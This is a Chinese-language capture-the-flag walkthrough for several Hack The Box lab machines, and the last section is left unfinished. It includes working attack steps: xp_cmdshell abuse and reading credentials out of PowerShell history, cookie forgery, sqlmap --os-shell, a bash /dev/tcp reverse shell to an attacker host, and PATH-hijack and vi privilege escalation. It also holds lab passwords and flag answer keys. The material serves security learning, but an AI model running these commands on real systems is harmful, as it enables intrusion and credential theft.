# start-point machine wp

## 第二层-archetype

nmap快速扫描：
```
Not shown: 60549 closed tcp ports (reset), 4974 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

smbclient列出共享：
```
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

登录到smb账户：
```
smbclient //10.129.167.167
```
里面有一个名为prod.dtsconfig，能看到密码为M3g4c0rp123
```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>% 
```

可以用上边的用户和密码登录进数据库，使用工具impacket(安装方法在官方wp里)，其中example文件夹下的mssqlclient.py脚本可以用来登录数据库。
``````
python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.167.167 -windows-auth
``````

进入数据库后，可以用help来查看相关的信息：
```
SQL (ARCHETYPE\sql_svc  dbo@master)> help

lcd {path}                 - changes the current local directory to {path}
exit                       - terminates the server process (and this session)
enable_xp_cmdshell         - you know what it means
disable_xp_cmdshell        - you know what it means
enum_db                    - enum databases
enum_links                 - enum linked servers
enum_impersonate           - check logins that can be impersonated
enum_logins                - enum login users
enum_users                 - enum current db users
enum_owner                 - enum db owner
exec_as_user {user}        - impersonate with execute as user
exec_as_login {login}      - impersonate with execute as login
xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
xp_dirtree {path}          - executes xp_dirtree on the path
sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
! {cmd}                    - executes a local shell cmd
show_query                 - show query
mask_query                 - mask query
```

可以看到xp_cmdshel可以执行命令，这个sql账户有普通用户的权限，所以如果后面传反shell失败的话，可以用type直接读取user.txt，但是后面获取管理员凭证不好搞，因为需要工具winPEAS来找到登录的日志文件，所以能传反shell尽量传反shell，这个shell麻烦且不稳定，但是传不了就算了(我就属于死活传不上去的)。

后面传不了反shell，直接崩了...

user.txt位置：
```
C:\Users\sql_svc\Desktop
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Desktop;type user.txt"
```

管理员凭证位置：
```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
输出：
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

可以直接用evil-winrm登录：
```
evil-winrm -i 10.129.95.187 -u administrator -p MEGACORP_4dm1n!!
```
密码的两个!对命令执行有干扰，如果执行出现问题，可以把-p参数去掉，等需要输入密码时再单独输密码，root.txt在Desktop(懒得写了)。


### 哪个 TCP 端口托管数据库服务器？
答案：1433

### SMB 上可用的非管理共享的名称是什么？
答案：backups

### SMB 共享上的文件中标识的密码是什么？
答案：M3g4c0rp123

### 可以使用 Impacket 集合中的哪个脚本来建立与 Microsoft SQL Server 的经过身份验证的连接？
答案：mssqlclient.py

### 可以使用 Microsoft SQL Server 的哪些扩展存储过程来生成 Windows 命令行界面？
答案：xp_cmdshell

### 可以使用什么脚本来搜索在 Windows 主机上提升权限的可能路径？
答案：winPEAS

### 哪个文件包含管理员的密码？
答案：ConsoleHost_history.txt

### 提交用户标志
答案：3e7b102e78218e935bf3f4951fec21a3

### 提交root标志
答案：b91ccec3305e98240082d4474b848528



## 第二层-Oopsie

nmap扫描：
``````
快速扫描：
22/tcp open  ssh
80/tcp open  http

版本扫描：
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)
|   256 241da417d4e32a9c905c30588f60778d (ECDSA)
|_  256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

漏洞扫描：
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

``````

gobuster扫描：
```
/images               (Status: 301) [Size: 313] [--> http://10.129.48.18/images/]
/themes               (Status: 301) [Size: 313] [--> http://10.129.48.18/themes/]
/uploads              (Status: 301) [Size: 314] [--> http://10.129.48.18/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.129.48.18/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.129.48.18/js/]
/fonts                (Status: 301) [Size: 312] [--> http://10.129.48.18/fonts/]

```

直接访问IP，检查源代码，发现页面/cdn-cgi/login/，可以以guest身份进入，有一个account的界面，此时url是http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2，id=2可以改为1，可以拿到：
```
34322 admin admin@megacorp.com
2233  guest	guest@megacorp.com
```
检查cookie可以看到前两个值可以对应，可以把2233改为34322，把guest改为admin，然后就是管理员权限，访问uploads界面，把准备好的反shell文件上传，访问http://IP/uploads/shellfiles，nc监听就可以拿到webshell。

在/var/www/html/cdn-cgi文件夹里有db.php的文件可以拿到用户robert的凭据，(webshell就可以拿到user.txt)，

db.php的内容
```
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

可以通过ssh登录robert：
```
ssh robert@IP
```
ssh进入后拿到user.txt，通过find命令查找suid文件(其实是通过题目提醒)，找到可以以root权限执行的可执行文件/usr/bin/bugtracker。

我拿到root.txt的方法：
通过strings bugtracker的命令可以看到这个可执行文件运行cat命令，而且位置在/root/reports，所以可以直接在输入框输入../root.txt拿到flag。

官方的方法：
通过在/tmp文件夹下创建一个名为cat的文件然后将/bin/sh输入：
```
echo "/bin/sh" > cat
```
然后给cat执行权限：
```
chmod u+x cat
```
然后再环境变量添加/tmp，让位于/usr/bin下的bugtracker识别:
```
export PATH=/tmp:$PATH
```
然后运行bugtracker，随便输入几个字符，激活我们创建的cat，就拿到root权限了，然后可以读到root.txt(此时cat已经不能用了，被替换了，可以使用tac读取root.txt)


### 使用什么样的工具可以拦截网络流量？
答案:proxy

### 返回登录页面的 Web 服务器上目录的路径是什么？
答案：/cdn-cgi/login


### 在Firefox中可以修改哪些内容来访问上传页面？
答案：cookie


### 管理员用户的访问ID是什么？
答案：34322

### 上传文件时，该文件显示在服务器上的哪个目录中？
答案：uploads

### 包含与 robert 用户共享的密码的文件是什么？
答案：db.php

### 使用选项“-group bugtracker”运行什么可执行文件来识别 bugtracker 组拥有的所有文件？
答案：find

### 无论哪个用户开始运行 bugtracker 可执行文件，用户权限将用于运行什么？
答案：root

### SUID代表什么？
答案：Set owner User ID

### 以不安全的方式调用的可执行文件的名称是什么？
答案：cat

### 提交用户标志
答案：f2c74ee8db7983851ab2a96a44eb7981

### 提交root标志
答案：af13b0bee69f8a877c3faf667f7beacf


## 第二层-vaccine

nmap快速扫描：
```
sudo nmap -Pn --min-rate 10000 -p- 10.129.9.183

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

nmap版本扫描：
```
sudo nmap -Pn -p21,22,80 -sC -sV 10.129.9.183

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.97
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

通过查看扫描结果，可以发现能用anonymous登录ftp:
```
ftp 10.129.9.183
```
输入anonymous，不用输入password，进入ftp后发现backup.zip文件，使用get backup.zip下载压缩包，使用unzip解压缩backup.zip文件，发现需要密码，使用john破解：
```
zip2john backup.zip > passwdtxt
爆破密码：
john passwd.txt
```
爆破后的密码是：
```
741852963        (backup.zip)
```
压缩包里有两个文件index.php和style.css
index.php内容重要的部分：
```
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>

```
拿到管理员密码：
```
username:admin
password:2cb42f8734ea607eefed3b70af13bbd3(md5)
john解密md5得到：
qwerty789   
```
访问IP使用凭据登录:
![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-08_19-53-49.png)
发现搜索栏可能有注入。

使用sqlmqp:
```
sqlmap -u "http://10.129.230.151/dashboard.php?search=0" --cookie="PHPSESSID=cqt9a9q4q84g1tgr8svgngl9ql" --os-shell
```
![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-08_20-23-05.png)
在--os-shell的基础上，弹一个反向shell:
```
bash -c "bash -i >& /dev/tcp/10.10.16.41/443 0>&1"
```
![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-08_20-22-53.png)

找到user.txt
![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-08_20-29-17.png)


在/var/www/htl/dashboard.php找到的密码
![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-08_20-34-40.png)
password:P@s5w0rd!

有了密码就可以运行sudo -l:
![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-09_18-38-33.png)

vi提权的基本操作：
```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
ESC
:set shell=/bin/sh ENTER
:shell
```

![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-09_19-10-38.png)



### 除了 SSH 和 HTTP 之外，此盒子上还托管了哪些其他服务？
答案：ftp

### 此服务可以配置为允许使用特定用户名的任何密码登录。那个用户名是什么？
答案：anonymous

### 通过此服务下载的文件的名称是什么？
答案：backup.zip

### John The Ripper 工具集附带了什么脚本，并以允许破解尝试的格式从受密码保护的 zip 存档中生成哈希值？
答案：zip2john

### 网站上管理员用户的密码是什么？
答案：qwerty789

### 可以将什么选项传递给 sqlmap 以尝试通过 sql 注入执行命令？
答案：--os-shell

### postgres 用户可以使用 sudo 以 root 身份运行什么程序？
答案：vi

### 提交用户标志
答案：ec9b13ca4d6229cd5cc1e09980965bf7

### 提交root标志
答案：dd6e058e814260bc70e9bbdef2715849


## 第二层-unified

这个房间有log4j的漏洞，需要有这个漏洞的前置知识

nmap快速扫描：
```


```





### 前四个开放端口是哪四个？
答案：22,6789,8080,8443

### 在端口 8443 上运行的软件的标题是什么？
答案：UniFi Network

### 正在运行的软件版本是什么？
答案：6.4.54

### 已识别漏洞的 CVE 是什么？
答案：CVE-2021-44228

### JNDI 在注入中使用什么协议？
答案：LDAP

### 我们使用什么工具来拦截流量，表明攻击成功？
答案：tcpdump

### 我们需要检查拦截的流量的哪个端口？
答案：

### MongoDB 服务在哪个端口上运行？
答案：

### UniFi 应用程序的默认数据库名称是什么？
答案：

### 我们在 MongoDB 中用来枚举数据库中的用户的函数是什么？
答案：

### 我们在 MongoDB 中更新数据库内用户的函数是什么？
答案：

### root 用户的密码是什么？
答案：

### 提交用户标志
答案：

### 提交根标志
答案：
